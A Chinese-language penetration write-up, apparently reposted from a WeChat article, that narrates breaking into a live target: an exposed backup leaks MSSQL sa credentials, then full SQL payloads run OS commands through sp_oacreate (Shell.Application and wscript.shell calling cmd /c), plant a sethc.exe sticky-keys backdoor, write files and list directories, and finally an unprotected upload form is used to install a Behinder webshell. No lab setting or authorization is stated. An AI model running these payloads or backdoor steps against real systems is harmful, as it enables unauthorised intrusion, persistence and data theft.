> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/k4z_PrGtLYEak0ei0dgydw)

**一、目录遍历**
==========

在对目标进行目录扫描的时候，发现其 app 目录存在目录遍历。 
--------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvsqHPu7cic7w0QyibNh6BUQPDR31uDWibMicV5yBOXTJrMiau5vXfZO5gbng/640?wx_fmt=png)

在目录中发现了 app 的备份文件，在备份中找到了其数据库文件

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvWp2mY33dGcfhEia9fCeYU8BVwrwMuugDpVfnFFwaicfzCb3ibjCumCCgg/640?wx_fmt=png)

 竟然使用的是 sa 账户连接的！！！

主站无 CDN，且 IP 地址与数据库配置文件中的 IP 不一致，典型的站库分离。

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvqIGW3m0wtXjswqdJAyfl0ibK2692tCyaTzQHMJ2hmibvia1O1Nv61U8KQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvJTnuuoia6ncuPoloia0vJUMDKIK7W6CTOkGL61savI5BekibicNkKuWlOQ/640?wx_fmt=png)

现在有 Sa 的账号密码，先从数据库开始渗透。

### 2、Mssql 渗透

#### （1）Xp_cmdshell

使用 sqlmap 直连数据库

```
sqlmap -d "db_type://user:pwd@ip:port/db" command
```

无法执行命令也没有回显，但是得到其版本为 2000。

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvQk9k9ZW5VmVZibcTy7nibXkzsmWwRTQCxaia9lMWnZb03GdbScXiba2R0g/640?wx_fmt=png)

尝试连接数据库手动执行命令。

Navicat 不支持连接 Mssql2000，这里改用 Database4 来连接。

Mssql2005 及以上版本默认关闭 Xp_cmdshell，2000 可以直接调用 Xp_cmdshell 执行命令。

连上之后执行命令报错了，

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvU8dN7GiabQCYeK5UqvBrEzEu4FBoQtDZmTRaJqJH6pSApReypQtPib9w/640?wx_fmt=png)

查了一下可能是因为数据库没权限创建 Cmd 进程。 

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFv5ibEbEzQIAw1LibYNWf3dibOLnh8OSWxsP6E92ED6jpFfaSjMyeltOIiaQ/640?wx_fmt=png)

#### （2）Sp_oacreate 执行命令

sp_oacreate 的劣勢是沒有回显，但是可以将命令的输出写到文件，我们再读取文件即可。

找到了 Sp_oacreate 两种执行命令的方式

```
declare @o int
exec sp_oacreate 'Shell.Application', @o out
exec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd
/c whoami >e:\test.txt','c:\windows\system32','','1';

declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami > c:\\1.txt'
```

在这里执行这两条命令，都会直接卡死，估计是被拦了。  

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvt9d2ibkc8EfzOicUDVeKmtr5Hm83N1Hvsic82Qg8HlIMlNwcbibaRqfs9g/640?wx_fmt=png)

#### （3）Sp_oacreate 粘贴键替换调用 Cmd

这种方式等于是做了一个 shift 后门。

```
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe'
,'c:\windows\system32\sethc.exe';


declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\sethc.exe'
,'c:\windows\system32\dllcache\sethc.exe';
```

语句可以成功執行，但是调不出来，未知原因。

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvNz6P5bqPrxJ8H6rjWIVhNM4vRaGTEJ3icAnWgoPDeN9oWoc50WeqCFw/640?wx_fmt=png)

#### （4）Sp_oacreate 读写文件

这个功能

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvmpBQwuS4IyTv4eycMeRYptvW2Cfgd8JT1jIxruEPctzmicV29tZnQxw/640?wx_fmt=png)

在有 Web 服务的时候很好用

```
declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'createtextfile', @f out, 'e:\tmp1.txt', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'tes1t'
```

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvr6C45bTic5YyJib3E7IWpXpEupacu1XtSYfqED9Wvw8cSNOqkdicegnibw/640?wx_fmt=png)

查看目录结构

```
execute master..xp_dirtree 'e:\',1,1
```

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvmpBQwuS4IyTv4eycMeRYptvW2Cfgd8JT1jIxruEPctzmicV29tZnQxw/640?wx_fmt=png)

查看文件内容
------

表名不能重复，查一次换一次表名。

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvQPiayTHGNIaq72cgEW7JAhtESxTKzgWXQ4roUJXvddDLtje7Al70b4Q/640?wx_fmt=png)

### 3、代码审计

代码审计过程中，在源码中找到一个 Upload 功能，对上传文件没有做任何防护。会直接将上传的文件，上传到 http:// 主站 IP:8082/upload 下。

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvCjrrAicO1Jq2LaPbdqiaEzrqxkXo1ibW6RicqJNLKM9LiafTMohBPrqllLA/640?wx_fmt=png)

构造 html 上传页面，并将其提交到 app 目录下的这个 upload.php 文件即可。

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvUicUqdOh5GrI0Zg9VmMHwgURf4ZNiaCwbPia48cOjHXpwrzZaQ11CQ8tw/640?wx_fmt=png)

先上传一个正常 "萨斯该" 的图片

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvHcUaVe0vHF0dZJSdA3CJKFTp6LJJibzOdibiafHv0QvJ2R6KiaVqULqX5Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFviach6nVdyO9Gu2Sozk5JuibyowDrH34u5w4Puhp6dq30FRk3UTQjC2Wg/640?wx_fmt=png)

这里有个坑，他给的路径是错的直接访问找不到。最后在主站下边的这个 app 目录下找到了

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvnfhWJPwYSHcolF3SUUBWCh0tVxwjNhkvrDok0aibppaNZ4picj9g7QgQ/640?wx_fmt=png)

上传 Webshell，刚上传一句话木马被杀了。

以为 php 不能上传，上传了个 phpinfo 可以执行，改上传冰蝎的马成功 Getshell。

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvbZ7WGTDChGUwqhPCPq1NhhNhwicLu41LuMQVhSIvbMlqDde9GTICJSg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/B0Ov264SNIJkUUGdmU7jXnSAibnuO2iaFvlXP1xWkATvG462NfQdwDB2uJ5bD5jxgibIaa4ZnCpic5clGAdFCHhvnQ/640?wx_fmt=png)

文章首发：先知社区 未经作者允许禁止转载

![](https://mmbiz.qpic.cn/mmbiz_gif/B0Ov264SNIIjeG1nUThibTFN6DRNDtGT7endzn6sEeFPPJ9l0YuWNltcsD1ia5D9TBwn9bwVn61YuLh1YetIFXEg/640?wx_fmt=gif)

点分享

![](https://mmbiz.qpic.cn/mmbiz_gif/B0Ov264SNIIjeG1nUThibTFN6DRNDtGT7YGzlxzZ4LT3cQyPyam7lswKTUE1XbicMzD7yxGV9Fe7mP3d3Nrbup7w/640?wx_fmt=gif)

点点赞

![](https://mmbiz.qpic.cn/mmbiz_gif/B0Ov264SNIIjeG1nUThibTFN6DRNDtGT7ZXibYCtiba6HVx71LdjPicsn10FKhxkSpibuDldMXS7iaXwqyFbIWHiaCUIg/640?wx_fmt=gif)

点在